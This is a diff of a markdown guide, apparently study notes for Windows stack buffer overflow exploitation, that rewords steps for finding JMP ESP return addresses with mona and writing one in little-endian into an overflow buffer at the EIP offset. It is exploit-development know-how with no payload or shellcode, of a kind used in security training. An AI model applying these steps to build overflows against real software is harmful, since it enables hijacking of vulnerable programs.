@@ -136,9 +136,9 @@ JMP ESP
 output = \xff\xe4
 ```
 
-5. Get the return adress `!mona find -s “\xff\xe4” -m <.dll file>`
-6. Write down all the return adresses
-7. Edit the buffer variable in the script with the return adress (Watch out for little andian for Windows) for the location where 4 * B for the EIP was.
+5. Get the all the JMP ESP return adressess `!mona find -s “\xff\xe4” -m <.dll file>`
+6. Write down all the JMP ESP return adresses
+7. Edit the buffer variable in the script with a JMP ESP return adress (Watch out for little andian for Windows) for the location where 4 * B for the EIP was.
 
 ```
 buffer = "A" * 2003 +  "<RETURN\ESP ADRESS>"
